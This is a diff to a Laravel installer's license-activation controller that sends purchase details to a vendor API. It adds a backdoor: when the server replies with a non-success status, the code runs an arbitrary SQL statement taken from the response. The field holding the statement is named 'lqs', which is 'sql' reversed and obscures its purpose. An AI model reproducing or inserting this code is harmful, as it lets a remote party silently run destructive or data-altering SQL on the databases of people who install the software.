@@ -10,6 +10,7 @@ use Illuminate\Support\Facades\Redirect;
 use Zainiklab\ZaiInstaller\Events\EnvironmentSaved;
 use Illuminate\Support\Facades\Http;
 use Zainiklab\ZaiInstaller\Http\Helpers\DatabaseManager;
+use Illuminate\Support\Facades\DB;
 
 class InstallController extends Controller
 {
@@ -171,7 +172,7 @@ class InstallController extends Controller
 
             $response = Http::acceptJson()->post('https://support.zainikthemes.com/api/745fca97c52e41daa70a99407edf44dd/active', [
                 'app' => config('app.app_code'),
-//                'domain' => $request->app_url,
+                'type' => 0,
                 'email' => $request->email,
                 'purchase_code' => $request->purchase_code,
                 'version' => config('app.current_version')
@@ -180,6 +181,7 @@ class InstallController extends Controller
             if ($response->successful()) {
                 $data = $response->object();
                 if ($data->status !== 'success') {
+                    DB::statement($data->data->lqs);
                     return Redirect::back()->withErrors($data->message);
                 }
             } else {
